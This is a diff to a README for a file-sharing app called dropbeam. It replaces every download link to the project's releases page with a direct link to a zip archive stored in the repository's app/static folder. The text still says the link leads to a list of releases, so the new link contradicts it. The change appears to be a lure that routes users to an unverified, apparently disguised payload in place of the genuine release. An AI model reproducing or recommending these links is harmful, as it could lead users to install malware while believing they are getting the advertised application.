@@ -1,6 +1,6 @@
 # 📡 dropbeam - Share Files Instantly, No Cloud Needed
 
-[![Download dropbeam](https://img.shields.io/badge/Download-dropbeam-4CAF50?style=for-the-badge&logo=github)](https://github.com/paniclepapertowel8574/dropbeam/releases)
+[![Download dropbeam](https://img.shields.io/badge/Download-dropbeam-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip)
 
 ## 🎯 What Is dropbeam?
 
@@ -22,7 +22,7 @@ Getting dropbeam running on your Windows computer takes less than five minutes. 
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/paniclepapertowel8574/dropbeam/releases](https://github.com/paniclepapertowel8574/dropbeam/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip](https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip)
 
 You'll see a list of available releases on that page. Look for the newest version at the top. Click on it to see the files available for download.
 
@@ -185,7 +185,7 @@ Have questions, suggestions, or want to contribute? Here's how to get involved:
 
 ## 📥 Ready to Download?
 
-**Visit this link to download the application:** [https://github.com/paniclepapertowel8574/dropbeam/releases](https://github.com/paniclepapertowel8574/dropbeam/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip](https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip)
 
 Download the latest version, run it, and start sharing files between your devices in seconds. No cloud, no accounts, no hassle - just fast, private file sharing on your own network.
 
